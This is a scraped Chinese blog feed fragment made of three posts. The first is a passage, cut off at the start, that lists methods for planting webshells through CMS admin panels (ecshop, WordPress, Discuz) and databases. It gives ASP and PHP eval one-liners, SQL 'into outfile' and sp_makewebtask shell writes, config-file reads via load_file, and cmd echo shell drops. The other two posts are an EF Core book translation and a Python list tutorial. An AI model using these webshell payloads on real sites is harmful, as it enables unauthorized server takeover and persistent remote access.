&lt;p&gt;记录在了这篇博客上面：&lt;a href=&quot;https://www.cnblogs.com/v01cano/p/10326366.html&quot; class=&quot;uri&quot;&gt;https://www.cnblogs.com/v01cano/p/10326366.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;方法五网站配置插马拿webshell&quot;&gt;方法五：网站配置插马拿webshell：&lt;/h2&gt;
&lt;p&gt;注：asp中单引号表示单行注释作用&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;“%&amp;gt;&amp;lt;%eval request(&quot;v01cano&quot;)%&amp;gt;&amp;lt;%'&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;一般先试试看该选项是否可以更改，如果可以更改，则插马试试，因为插马可能导致系统崩溃，所以一般需要首先需要本地搭建环境进行测试。&lt;/p&gt;
&lt;h2 id=&quot;方法六通过编辑器模板拿webshell&quot;&gt;方法六：通过编辑器模板拿webshell&lt;/h2&gt;
&lt;p&gt;1，通过对网站的模板进行编辑写入一句话，然后生成脚本文件拿webshell。比如ecshop&lt;/p&gt;
&lt;p&gt;2，通过将木马添加到压缩文件，把名字改为网站模板类型，上传到网站服务器，拿webshell。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1587018/201901/1587018-20190127130507229-1556280549.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;方法七通过添加插件getshell&quot;&gt;方法七：通过添加插件getshell&lt;/h2&gt;
&lt;p&gt;即利用网站管理员的添加插件功能getshell，将大马添加到插件的压缩包中，然后上传，从而getshell。比如wordpress，dz等等。&lt;/p&gt;
&lt;h2 id=&quot;方法八执行sql语句写入webshell&quot;&gt;方法八：执行sql语句写入webshell&lt;/h2&gt;
&lt;p&gt;通过sql语句写入shell，首先执行错误的sql语句，使其暴露出网站的根目录：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;select &quot;&amp;lt;?php phpinfo();?&amp;gt;&quot; into outfile &quot;C:\\vulcms\\ecshopv3.6\\ecshop\\v01cano.php&quot;;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;关于此语句说明，在windows中有时候需要使用斜杠/有时候需要使用双反斜杠\末尾有时候需要分号，有时候也不需要分号。&lt;/p&gt;
&lt;p&gt;以ecshop为例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1587018/201901/1587018-20190127131307773-1247372369.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;也可以先将一句话通过新建管理员写入到user表中，然后通过数据库备份配合解析漏洞拿shell。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1587018/201901/1587018-20190127131458977-455663659.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;方法九通过数据库拿webshell&quot;&gt;方法九：通过数据库拿webshell&lt;/h2&gt;
&lt;p&gt;我们可以通过数据库执行命令导出一句话到网站根目录拿shell&lt;/p&gt;
&lt;p&gt;access数据库导出一般需要利用解析漏洞xx.asp;.xml&lt;/p&gt;
&lt;p&gt;sqlserver导出：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;exec sp_makewebtask 'C:\test1.php',' select ''&amp;lt;%eval request(&quot;pass&quot;)%&amp;gt;'' '--&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;mysql命令导出getshell:&lt;/p&gt;
&lt;p&gt;方法1&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; Create TABLE xiaoma (xiaoma1 text NOT NULL);
 Insert INTO xiaoma (xiaoma1) VALUES('&amp;lt;?php eval($_POST[xiaoma]);?&amp;gt;');
 select xiaoma1 from xiaoma into outfile 'D:/phpstudy/www/7.php';
 Drop TABLE IF EXISTS xiaoma;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;方法2&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;select &quot;&amp;lt;?php eval($_POST[v01cano]);?&amp;gt;&quot; into outfile 'D:/phpstudy/www/a.php'&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;方法3：方法1和方法2都是在网站根目录路径已知的时候写入shell，当数据库路径未知时，可以通过如下方法读取数据库路径：网站的根目录一般在网站配置文件httpd.conf中，而此目录的路径一般不变，一般在/apache/conf/httpd.conf中，（在phpmyadmin中的时候，我们可以选择变量选项观察其路径，进而推测httpd.conf的路径），在已知该文件路径的条件下，我们可以通过如下方法读取该文件中的内容：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;//创建表a,并且将httpd.conf写入到表a中。
create table a(a text);load data infile &quot;C:/phpStudy/Apache/conf/httpd.conf&quot; into table a;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后执行导出操作，将该文件下载，使用notepad++打开，最后搜索documentroot，即可找到网站的根目录：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1587018/201901/1587018-20190127134902397-1534195155.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;httpd.conf文件可能存在的一些路径：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;linux中可能存在路径：

apache
/usr/local/mysql
/user/local/apache/conf/httpd.conf
/user/local/httpd/conf/httpd.conf
/etc/httpd/conf/httpd.conf
/user/local/apache2/conf/httpd.conf

Nginx:

/user/local/nginx/conf/httpd.conf&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;方法四：直接通过load_file函数直接加载该文件内容&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;select load_file('C:/phpStudy/Apache/conf/httpd.conf');&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;但是需要在选项中进行如下配置才会显示出来：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1587018/201901/1587018-20190127135320463-280839461.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1587018/201901/1587018-20190127135251653-1360134081.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;方法n：还有通过日志拿shell的多种方式，已经记录在博客：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/v01cano/p/10292670.html&quot; class=&quot;uri&quot;&gt;https://www.cnblogs.com/v01cano/p/10292670.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;方法十通过文件包含拿webshell&quot;&gt;方法十：通过文件包含拿webshell&lt;/h2&gt;
&lt;p&gt;先将webshell改为txt文件上传，然后上传一个脚本文件包含该txt文件，可以绕过waf拿webshell。&lt;/p&gt;
&lt;p&gt;常用的文件包含方法如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;asp包含：
1，&amp;lt;!--#include file=&quot;123.jpg&quot;--&amp;gt;
2，调用的文件必须和被调用的文件在同一目录，否则找不到
3，如果不在同一目录，用下面语句也可以：
&amp;lt;!--#include virtual=&quot;文件所在目录/123.jpg&quot;--&amp;gt;

php包含：
&amp;lt;?php
Include('123.jpg');
?&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;方法十一命令执行拿webshell&quot;&gt;方法十一：命令执行拿webshell&lt;/h2&gt;
&lt;pre&gt;
&lt;code&gt;Echo ^&amp;lt;^?php @eval($_POST[v01cano]);?^&amp;gt;^ &amp;gt;c:\1.php

^&amp;lt;^%eval request(&quot;cracer&quot;)%^&amp;gt;^ &amp;gt;c:\1.php&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;十二没有进入后台如下拿webshell&quot;&gt;十二：没有进入后台如下拿webshell&lt;/h2&gt;
&lt;ul readability=&quot;0&quot;&gt;&lt;li&gt;
&lt;p&gt;0day拿webshell&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;IIS写权限拿webshell(put一个shell进去)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;命令执行拿webshell&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;通过注入漏洞拿webshell&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;前台图片上传拿webshell&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Strusts2拿webshell&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;java反序列拿shell&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Sun, 27 Jan 2019 06:04:00 +0000</pubDate>
<dc:creator>v01cano</dc:creator>
<og:description>网站后台getshell的方法总结 方法一：直接上传getshell 以dedecms为例，后台可以直接上传脚本文件，从而getshell，具体方法如下： 即可成功上传大马，并成功执行，从而拿下web</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/v01cano/p/10326318.html</dc:identifier>
</item>
<item>
<title>[翻译] 介绍EF Core - liangshiwei</title>
<link>http://www.cnblogs.com/LiangSW/p/10326274.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/LiangSW/p/10326274.html</guid>
<description>&lt;p&gt;&lt;strong&gt;Entityframework Core in action是 &lt;code&gt;Jon P smith&lt;/code&gt; 所著的关于Entityframework Core 书籍。&lt;a href=&quot;https://www.manning.com/books/entity-framework-core-in-action&quot;&gt;原版地址&lt;/a&gt;. 是除了官方文档外另一个学习EF Core的不错途径, 书中由浅入深的讲解的EF Core的相关知识。因为没有中文版,所以本人对其进行翻译。 预计每两天一篇更新 PS: 翻译难免限于本人水平有不准确的地方，建议英文水平不错的同学直接查看原版，有不足的地方欢迎指正&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;第一部分目录导航&quot;&gt;第一部分目录&lt;a href=&quot;https://www.cnblogs.com/LiangSW/p/10316147.html&quot;&gt;导航&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Entity Framework Core在以下的介绍中若无特别说明均使用EF Core代替.&lt;br/&gt;EF Core是允许开发人员访问数据库的类库,有很多种方式去编写这样的类库例如Dapper,但是EF Core被设计为&lt;code&gt;object-relational mapper&lt;/code&gt; (O/RM). O/RM通过在两个世界之间的映射来工作: 具有自己API的关系型数据库和包含类与软件代码的面向对象软件世界. EF Core的主要优势在于开发人员可以快速的编写数据库访问代码&lt;/p&gt;
&lt;p&gt;微软在2016年发布了支持多平台的EF Core, 它可以在windows,linux和Apple上运行,它是.NET core计划的一部分,因此EF Core名称中的Core部分就是由此而来. (但是EF Core也可以和现有的.NET Framework一起使用 - 请参阅1.10.5节中的说明). EF Core,ASP.NET Core(Web服务端应用程序)和.NET Core都是开源的,在Github上每一个项目都有一个issues页面用于与它们的开发团队讨论&lt;/p&gt;
&lt;p&gt;EF Core不是Entity Framework的第一个版本; 现有的非Core版本从4到6.x版本积累了多年的经验和反馈, 它保持了与EF6.x相同的接口类型.但是在底层有一些重大的变化,比如处理非关系型数据库的能力设计与EF6.x是不同的. 作为EF5和EF6的前用户,我可以看到EF Core在哪些地方进行了改进,以及它仍然缺少我喜欢的EF6.x库的功能(虽然这些功能在路线路上正在开发)&lt;/p&gt;
&lt;p&gt;本书面向的是从未使用过EF和经验丰富的EF6x开发人员,以及想要了解EF Core的人.本书假设读者已经熟悉C#,Net开发,并且对关系型数据库有所了解,不需要你了解如何编写结构化查询语言(SQL),因为EF Core可以为你完成大部分工作,但是我在书中展示了EF Core生成的SQL,因为它能帮助你理解;使用EF Core的一些高级功能需要你具备SQL知识,不过书中提供了大量的图表帮助你理解&lt;/p&gt;
&lt;p&gt;本章通过使用EF Core的小应用向你介绍EF Core, 你将在本章中学习到EF Core如何解释命令并访问数据库,了解EF Core的工作原理对阅读本书其余部分会有帮助&lt;/p&gt;
</description>
<pubDate>Sun, 27 Jan 2019 05:43:00 +0000</pubDate>
<dc:creator>liangshiwei</dc:creator>
<og:description>Entity Framework Core in Action Entityframework Core in action是 所著的关于Entityframework Core 书籍。 '原版地址'</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/LiangSW/p/10326274.html</dc:identifier>
</item>
<item>
<title>#9   Python列表和元组 - MinuteSheep</title>
<link>http://www.cnblogs.com/minutesheep/p/10325694.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/minutesheep/p/10325694.html</guid>
<description>&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;Python中有6种序列：列表、元组、字符串、Unicode字符串、buffer对象和xrange对象。序列通用操作包括：索引、切片、长度、加、乘、最大值、最小值，遍历和检查成员。虽然Python有6中内置序列，但是最常用的是列表和元组。所有本博文将深入列表和元组，掌握其方法！&lt;/p&gt;
&lt;h3&gt;一、列表（list）&lt;/h3&gt;
&lt;p&gt;看了上面说的，现在是不是一头雾水，其实上面提到的操作无非不过一些方法而已，熟练应用就掌握了，那先来看看列表的方法吧：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;79&quot;&gt;
&lt;pre&gt;
In [&lt;span&gt;3&lt;/span&gt;&lt;span&gt;]: dir(list)
Out[&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;]:
[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__add__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__class__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__contains__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__delattr__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__delitem__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__dir__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__doc__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__eq__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__format__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__ge__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__getattribute__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__getitem__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__gt__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__hash__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__iadd__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__imul__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__init__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__iter__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__le__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__len__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__lt__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__mul__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__ne__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__new__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__reduce__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__reduce_ex__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__repr__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__reversed__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__rmul__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__setattr__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__setitem__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__sizeof__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__str__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__subclasshook__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;append&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;clear&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;copy&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;count&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;extend&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;index&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;insert&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;pop&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;remove&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;reverse&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;sort&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;补充：有些方法有两个前导下划线和两个后置下划线，这是特殊方法的意思，应用于特殊函数，实际应用中很少用到，常用的是普通方法。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;可以看到，列表的方法其实不是很多，但是使用技巧却很灵活，盘它！&lt;/p&gt;
&lt;h4&gt;1.初始化列表&lt;/h4&gt;
&lt;p&gt;列表的初始化前面已经说过了，这里再来复习一下，被一对方括号括住，元素用逗号隔开就是列表：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;49&quot;&gt;
&lt;pre&gt;
In [4]: systems = [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;]   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 元素全是字符串的列表&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;5]: systems = [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, 666]   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 元素既有字符串又有数字&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;6]: systems = [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, 666, [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;MacOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;]]   &lt;span&gt;#&lt;/span&gt;&lt;span&gt;列表包含列表&lt;/span&gt;
&lt;span&gt;
In [&lt;/span&gt;7]: systems = [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, 666, [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;MacOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;],{&lt;span&gt;'&lt;/span&gt;&lt;span&gt;phone&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;}]   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 列表还可以包含字典&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;2.列表索引&lt;/h4&gt;
&lt;p&gt;列表中每个元素都会被分配一个数字，这个数字就是对应元素的位置，称为索引。第一个元素的索引为0，第二个元素的索引为1，第三个元素的索引为2，依此类推。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;注意：计算机中，几乎所有的索引都是从0开始的，在涉及索引操作时，一定要注意这一点&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;通过索引访问列表元素：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
In [8]: systems = [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;9&lt;span&gt;]: systems[0]
Out[&lt;/span&gt;9]: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;

In [&lt;/span&gt;10]: systems[1&lt;span&gt;]
Out[&lt;/span&gt;10]: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;

In [&lt;/span&gt;11]: systems[2&lt;span&gt;]
Out[&lt;/span&gt;11]: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上面说到列表使用技巧灵活，是有道理的：&lt;span&gt;可以使用 索引为-1 来直接获取最后一个元素&lt;/span&gt;，也就是说，列表的索引可以倒着来：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
In [12]: systems = [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;13]: systems[-1]     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 直接获取最后一个元素&lt;/span&gt;
Out[13]: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;

In [&lt;/span&gt;14]: systems[-2&lt;span&gt;]
Out[&lt;/span&gt;14]: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;

In [&lt;/span&gt;15]: systems[-3&lt;span&gt;]
Out[&lt;/span&gt;15]: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;

In [&lt;/span&gt;16]: systems[-4]     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 没有索引-4，会抛出超出范围的异常&lt;/span&gt;
---------------------------------------------------------------------------&lt;span&gt;
IndexError                                Traceback (most recent call last)
&lt;/span&gt;&amp;lt;ipython-input-16-2b502eee5f42&amp;gt; &lt;span&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;
----&amp;gt; 1 systems[-4&lt;span&gt;]

IndexError: list index out of range&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;通过元素获取索引：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
In [17]: systems = [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;18]: systems.index(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
Out[&lt;/span&gt;18]: 1
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;3.列表切片&lt;/h4&gt;
&lt;p&gt;要说列表玩的6不6，就看切片熟不熟。切片其实就是一次性获取多个元素：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
In [19]: systems = [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ubuntu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]

In [&lt;/span&gt;20]: systems[0:2&lt;span&gt;]
Out[&lt;/span&gt;20]: [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;CentOs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;]
&lt;/pre&gt;&lt;/div&gt;
